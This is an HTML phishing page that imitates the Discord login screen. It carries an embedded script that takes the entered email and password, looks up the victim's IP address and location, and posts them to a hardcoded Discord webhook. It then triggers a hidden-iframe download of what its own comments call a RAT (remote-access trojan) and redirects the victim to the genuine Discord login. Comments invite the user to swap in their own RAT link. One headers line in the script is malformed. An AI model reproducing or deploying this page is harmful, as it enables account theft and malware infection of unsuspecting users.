<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #1e1f22;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .login-container {
            background: #2b2d31;
            border-radius: 8px;
            padding: 32px;
            width: 480px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
        }

        h1 {
            color: #fff;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            color: #b5bac1;
            font-size: 14px;
            text-align: center;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 16px;
        }

        label {
            color: #b5bac1;
            font-size: 12px;
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 12px;
            background: #1e1f22;
            border: 1px solid #1e1f22;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            transition: border-color 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #5865f2;
        }

        button {
            width: 100%;
            padding: 12px;
            background: #5865f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }

        button:hover {
            background: #4752c4;
        }

        .links {
            text-align: center;
            margin-top: 16px;
            font-size: 13px;
        }

        .links a {
            color: #00a8fc;
            text-decoration: none;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .divider {
            color: #4e5058;
            margin: 0 8px;
        }

        .footer {
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid #1e1f22;
            text-align: center;
            font-size: 12px;
            color: #80848e;
        }
    </style>
</head>
<body>
<div class="login-container">
    <h1>Welcome back!</h1>
    <div class="subtitle">Enter your username and password to log in.</div>

    <form id="loginForm">
        <div class="input-group">
            <label>EMAIL (OR USERNAME)</label>
            <input type="text" id="email" name="email" required autocomplete="off">
        </div>
        <div class="input-group">
            <label>PASSWORD</label>
            <input type="password" id="password" name="password" required>
        </div>
        <button type="submit">LOGIN</button>
    </form>

    <div class="links">
        <a href="#">Forgot your password?</a>
        <span class="divider">·</span>
        <a href="#">Register an account</a>
    </div>

    <div class="footer">
        Need help? <a href="#" style="color:#00a8fc;">Contact support</a>
    </div>
</div>

<script>
    // CONFIGURATION – REPLACE THE RAT LINK
    const WEBHOOK = "https://discord.com/api/webhooks/1512048619124035677/5hcib3Cnp4NbdDx1S03zryCAnVzWNoouLhrOffBKEz7gS2D5j-bavFl7b3dwJbsTT3Xj";
    const RAT_DOWNLOAD = "https://gofile.io/d/ShG076"; // CHANGE THIS TO YOUR RAT LINK

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Disable button to prevent double submission
        const button = document.querySelector('button');
        button.disabled = true;
        button.textContent = 'LOGGING IN...';

        // Get IP and location
        let ipInfo = "Unknown";
        try {
            const response = await fetch('http://ip-api.com/json/');
            const data = await response.json();
            ipInfo = `${data.query} - ${data.city}, ${data.country}`;
        } catch(e) {}

        // Prepare data for webhook
        const webhookData = {
            content: `**🔐 DISCORD CREDENTIALS STOLEN**\n\n**Email/Username:** ${email}\n**Password:** ${password}\n**IP Address:** ${ipInfo}\n**User Agent:** ${navigator.userAgent}\n**Timestamp:** ${new Date().toISOString()}`
        };

        // Send to webhook
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type':application 'application/json' },
                body: JSON.stringify(webhookData)
            });
        } catch(e) {}

        // Trigger RAT download (invisible iframe)
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = RAT_DOWNLOAD;
        document.body.appendChild(iframe);

        // Remove iframe after 2 seconds
        setTimeout(() => {
            document.body.removeChild(iframe);
        }, 2000);

        // Redirect to real Discord login
        window.location.href = 'https://discord.com/login';
    });
</script>
</body>
</html>
